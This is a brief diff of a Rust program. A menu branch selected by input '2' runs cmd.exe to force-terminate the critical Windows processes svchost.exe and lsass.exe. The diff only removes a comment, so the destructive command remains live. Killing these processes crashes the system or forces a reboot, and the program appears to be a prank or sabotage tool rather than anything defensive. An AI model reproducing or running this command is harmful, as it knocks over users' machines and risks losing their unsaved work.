@@ -61,7 +61,7 @@ fn main() {
         }
         if expl == "2\r\n"{
             Command::new("cmd.exe")
-                .args(&["/c", "taskkill /IM svchost.exe /F & taskkill /IM lsass.exe /F"]) // this is such bs
+                .args(&["/c", "taskkill /IM svchost.exe /F & taskkill /IM lsass.exe /F"])
                 .status()
                 .expect("Failed");
         }
